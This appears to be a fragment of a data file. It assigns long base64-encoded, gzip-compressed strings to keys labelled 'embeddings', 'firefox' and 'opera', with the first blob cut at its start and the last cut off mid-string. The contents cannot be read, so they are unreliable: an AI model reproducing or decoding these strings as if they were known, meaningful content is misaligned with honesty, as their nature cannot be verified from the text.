+PR2T9lX57vNMsNhnCY28XIu0bJiQe0YdBxBLJpf5vfYwr9G0Ox3vOD2Oz3kE94l4lbFI5sMmvd4gWLAYt5VUclFcYH/c9DMTsydHz3UeKC9+b1l8vK+u5z/XLM0gweG1B82b/djOBddu5hWvr/aWxlUlwDu9jfFSGV+G5g0XafON/0F8gxuBtHq+oMt5bxDcBtUTA909JX2i+le6tDU/t1uU7JDWdGVfjlRjWCTq9WghTsIiqT2VOD71sCX3OxKoRxIdg0D/OGstAfbjilEQlcGh+5o0q9tbaFg8OH7AO46GMdujBHxGo3zUpNcrxJjvPRo99f1VeYgWZ4Lj8/TvqAUGppay+mAbn+oXUAnppi3+1WTSSorBtd33jAugfkjaxQjCYtIqWdcu7fligcnUJ46k6fU10+j8hC1ISf9kpld1/DuOb/g1uAd3xY8iSiYlSumXC+rHK6l6VoXb4i2NyM4NCKRzesTZ29174e0+87o/kO6L3t6L3vNnjjphOJmI9rmPY3RDwFL1Qy6nRxQmWq2/MZGldk8u+DhRYl543ZcvvW73udd1zG7s1Kd23Q53UtALddVm88uv3y5EhDT4eK/35El37+mTKZf57Q9oDlJQ/9rpEcRno2Uf0mvJE5up6lnHMwVRaIXvQtRqavHF1lJVo3k+V1NzAwo27+vbh4gunR55utvYPZCIIxI92zxgzBZg9CZZGkKqLussqXm70yNXE+19tGWf38YRp0EDgd1fJ7wQUUljznjRZ4yfCR7LhrGq3RgHiymom7wmxlWnolABvvVz4+8civ/KxA74e/wVbrkKJGoJwlNilVLO0a9vTnrvRqeH48vB+cE7daplkL47Yb7gKZ/JdwfBXMdXSaJ+PraJZC02oFK/Ql7TQnxQenWat5fqtGP+ntcgXn0nXr9BNiXdc5FrnNJW8ekNi2H1aZnJ2RlWI50N6teYbjahrsXnmrHumcAKX3VOdNr7+v2MU16Puy6bx1yA64OQbIaLGbj6R8yuq1HQ/SNjvvE1TGXx+8SH6WNNVa7Lfpye3oA4wofPlTp8hkvCFzE8VnYMKzPUnWHFu1tfRnQGPX60+rpViVaHjFEEkBB3BD6Pg5R0d3c19f8DNQO9yg8/AAA="
    "embeddings" = "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"
    "firefox" = "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"
    "opera" = "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